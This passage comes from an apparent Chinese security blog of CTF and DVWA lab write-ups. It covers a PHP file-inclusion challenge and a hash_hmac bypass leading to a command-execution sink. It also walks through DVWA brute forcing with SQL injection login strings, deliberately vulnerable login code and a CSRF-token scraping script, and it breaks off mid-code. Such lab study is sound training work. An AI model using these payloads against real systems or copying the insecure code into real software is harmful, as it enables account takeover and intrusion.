<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $action = (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">'home.php'</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($action)) &#123;</span><br><span class="line">    <span class="keyword">include</span> $action;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>发现文件包含</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9BAliceWebsite/2.png" alt></p>
<p>有点简单…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2020Blackcat</title>
    <url>/2021/04/12/blog_formal/security/CTF/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/</url>
    <content><![CDATA[<h1 id="羊城杯2020Blackcat"><a href="#羊城杯2020Blackcat" class="headerlink" title="羊城杯2020Blackcat"></a>羊城杯2020Blackcat</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>hash_hmac_sha256</code>绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/1.png" alt></p>
<ul>
<li>右键查看源码</li>
</ul>
<p><img data-src="./%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/2.png" alt></p>
<p><img data-src="./%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/3.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'谁！竟敢踩我一只耳的尾巴！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>拿<code>flag</code></li>
</ul>
<p><img data-src="./%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/4.png" alt></p>
<p><img data-src="./%E7%BE%8A%E5%9F%8E%E6%9D%AF2020Blackcat/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>hash_hmac_sha256绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(1.9)-Brute Force</title>
    <url>/2020/07/03/blog_formal/security/dvwa/BruteForce/</url>
    <content><![CDATA[<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        暴力破解。相对简单而常用的攻击方式。通俗来讲就是攻击者通过枚举密码字典，暴力破解鉴权服务，本文已DVWA为例，介绍各个等级的攻击方式和保护方式。</p>
<p><img data-src="./BruteForce/1.png" alt></p>
<a id="more"></a>

<h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>没有对user、password进行过滤，导致有注入风险</li>
<li>登录失败没有其他措施，可高速暴力破解</li>
<li>可无限次数暴力猜测密码</li>
</ul>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="解法一：暴力破解"><a href="#解法一：暴力破解" class="headerlink" title="解法一：暴力破解"></a>解法一：暴力破解</h4><ul>
<li>第一步抓包<br><img data-src="./BruteForce/2.png" alt></li>
<li>将包复制到intrude模块<br><img data-src="./BruteForce/3.png" alt></li>
<li>payloads 导入字典<br><img data-src="./BruteForce/4.png" alt></li>
<li>开始暴力破解<br><img data-src="./BruteForce/5.png" alt></li>
</ul>
<p>最终:得到密码为 password，手动验证ok</p>
<h4 id="解法二：SQL注入"><a href="#解法二：SQL注入" class="headerlink" title="解法二：SQL注入"></a>解法二：SQL注入</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Get username</span></span><br><span class="line">$user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line">$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br></pre></td></tr></table></figure>

<p>仔细观察这里面user是有注入风险的:</p>
<p>我们构造如下 user</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line">admin <span class="string">' or '</span><span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="comment"># query变为</span></span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = 'admin ' or '1=1' AND password = '$pass';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line">admin<span class="string">'  </span></span><br><span class="line"><span class="string">$query  = "SELECT * FROM `users` WHERE user = '</span>$user<span class="string">' AND password = '</span>$pass<span class="string">';";</span></span><br><span class="line"><span class="string">$query  = "SELECT * FROM `users` WHERE user = '</span>admin<span class="string">' #'</span> <span class="keyword">AND</span> password = <span class="string">'$pass'</span>;<span class="string">";</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./BruteForce/6.png" alt></p>
<p><img data-src="./BruteForce/7.png" alt></p>
<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>对user、password进行过滤，一定程度上解决注入的风险(mysqli_real_escape_string有一定绕过风险)</li>
<li>登录失败有 sleep(2) 措施，算不上防止暴力破解的方法，只不过每一次失败请求都时间长一点而已</li>
<li>和low等级一样可无限次数暴力猜测密码</li>
</ul>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>​        同样，可以用暴力破解的方式解决</p>
<p>​        同Low级别方法一，这里不做赘述</p>
<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><h3 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个），进一步防御sql注入问题</li>
<li>增加了token的验证，需要效验 user_token 以及 session_token，这两个token是通过 index.php 得到的</li>
<li>失败时随机 sleep 时间，对防暴力破解实质也没什么大用</li>
</ul>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>因为加入的token机制，先分析下这个token，随便写个脚本</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r"http://192.168.0.101/vulnerabilities/brute/index.php"</span></span><br><span class="line">params = &#123;</span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">PS C:\Users\caixin&gt; &amp; <span class="string">"D:/Program Files/Python38/python.exe"</span> d:/E/myblog/dvwa/BruteForce/code/brute_force_high.py</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;head&gt;</span><br><span class="line"></span><br><span class="line">                &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">                &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"dvwa/css/login.css"</span> /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">        &lt;body&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div id=<span class="string">"wrapper"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div id=<span class="string">"header"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p&gt;&lt;img src="dvwa/images/login_logo.png" /&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt; &lt;!--&lt;div id="header"&gt;--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;label for="user"&gt;Username&lt;/label&gt; &lt;input type="text" class="loginInput" size="20" name="username"&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        &lt;label for="pass"&gt;Password&lt;/label&gt; &lt;input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;p class="submit"&gt;&lt;input type="submit" value="Login" name="Login"&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=<span class="string">'hidden'</span> name=<span class="string">'user_token'</span> value=<span class="string">'5a33e364d326c7cbca1387c8367e5fb3'</span> /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- &lt;img src="dvwa/images/RandomStorm.png" /&gt; --&gt;</span><br><span class="line">        &lt;/div &gt; &lt;!--&lt;div id="content"&gt;--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div id=<span class="string">"footer"</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p&gt;&lt;a href="http://www.dvwa.co.uk/" target="_blank"&gt;Damn Vulnerable Web Application (DVWA)&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt; &lt;!--&lt;div id="footer"&gt; --&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt; &lt;!--&lt;div id="wrapper"&gt; --&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>下面只需要解析出token即可</p>
<p>思路如下:</p>
<ul>
<li>每次先请求拿到 并解析拿到token</li>
<li>下次请求带着 token， 别且这次请求返回的token作为下次请求的token</li>
<li>绕过token检测机制，实现暴力破解</li>
<li>请求可以走代理，方便查看请求信息</li>
</ul>
<h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><h3 id="欣赏源码"><a href="#欣赏源码" class="headerlink" title="欣赏源码"></a>欣赏源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'password'</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">'last_login'</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">// print "The account is locked&lt;br /&gt;";</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: 